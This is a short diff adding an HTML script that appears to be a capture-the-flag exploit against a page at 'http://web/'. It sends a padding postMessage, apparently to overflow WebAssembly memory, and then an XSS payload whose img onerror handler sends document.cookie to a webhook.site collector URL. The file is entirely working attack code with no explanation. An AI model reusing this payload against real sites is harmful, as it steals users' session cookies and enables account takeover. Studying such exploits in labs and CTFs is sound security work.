@@ -1,0 +1,13 @@
+<script>
+    const i = open("http://web/")
+    setTimeout(_=>{
+        i.postMessage("A".repeat(0x1000-2),"*")
+        i.postMessage("\x01\x00\x00\x00<img src=x onerror=fetch(`http://webhook.site/3b30031d-0097-459d-b501-d243e8fc5ec1?${document.cookie}`)>","*")
+        i.postMessage("","*")
+        i.postMessage("","*")
+        i.postMessage("","*")
+        //setTimeout(() => {
+        //    console.log(new Uint8Array(wasm.memory.buffer).toString())
+        //}, 1000);
+    },1500)
+</script>
